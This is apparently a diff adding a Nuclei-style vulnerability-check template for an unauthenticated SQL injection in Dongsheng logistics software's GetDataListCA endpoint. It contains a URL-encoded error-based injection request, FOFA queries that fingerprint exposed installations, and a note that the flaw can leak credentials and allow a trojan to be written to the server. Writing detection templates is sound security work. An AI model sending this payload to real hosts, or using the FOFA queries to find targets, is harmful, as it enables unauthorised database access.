@@ -1,0 +1,29 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - qqxvq1qbjjq
+            - 转换成数据类型 int 时失败
+        - status:
+            - 500
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /MvcShipping/MsCwGenlegAccitems/GetDataListCA?PACCGID=1%27%29+AND+6782+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%286782%3D6782%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--+OevW HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+id: dongsheng-GetDataListCA-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"
+        东胜物流软件 GetDataListCA  接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 东胜物流软件 GetDataListCA SQL注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247489396&idx=1&sn=6b62f3c852c792bc5b8fdc6bed3797b6&chksm=c267a247f5102b51bd3cb8b2a7369107132a4f25015ba0050c02579fc96dc216a588bd97be19&token=279945389&lang=zh_CN#rd
+    severity: high
+    tags:
+        - 东胜物流软件
